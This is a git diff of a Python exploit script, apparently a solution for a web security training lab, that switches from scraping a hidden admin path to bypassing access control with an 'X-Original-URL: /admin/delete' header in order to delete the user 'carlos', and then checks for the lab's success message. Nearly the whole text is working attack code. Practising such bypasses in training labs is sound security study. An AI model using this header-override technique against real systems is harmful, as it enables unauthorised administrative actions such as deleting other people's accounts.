@@ -3,6 +3,7 @@ import sys
 import urllib3
 from bs4 import BeautifulSoup
 import re
+import json
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore
 
@@ -17,24 +18,19 @@ headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
 }
 
-def get_admin_path(s, url):
-    r = s.get(url)
-    soup = BeautifulSoup(r.text, 'html.parser')
-    js_code = soup.find(string=re.compile('/admin'))
-    print(js_code)
-    admin_path = re.search("'href', '(.*)'", js_code).group(1) # type: ignore
-    return admin_path
 
-def delete_carlos_acc(s, url, admin_url):
-    delete_url = url + admin_url + '/delete'
-    payload = { 'username': 'carlos' }
+def delete_acc(s, url, username):
+    delete_url = url + '/'
+    headers = { 'X-Original-URL': '/admin/delete' }
+    payload = { 'username': username }
     r = s.get(delete_url, data=payload, headers=headers)
 
-    if 'User deleted successfully!' in r.text:
-        print('[+] Successful solved lab')
-    else:
-        print('[-] Fail to exploit lab')
-        sys.exit(-1)
+def check_solved_lab(s, url):
+    r = s.get(url)
+    if "Congratulations, you solved the lab!" in r.text:
+        print("[+] Successful solved lab")
+        sys.exit(0)
+    print('[-] Fail to exploit lab')
 
 def main():
     if len(sys.argv) != 2:
@@ -45,8 +41,8 @@ def main():
     s = requests.Session()
     url = sys.argv[1]
 
-    admin_path = get_admin_path(s, url)
-    delete_carlos_acc(s, url, admin_path)
+    delete_acc(s, url, 'carlos')
+    check_solved_lab(s, url)
     
 
 if __name__ == '__main__':
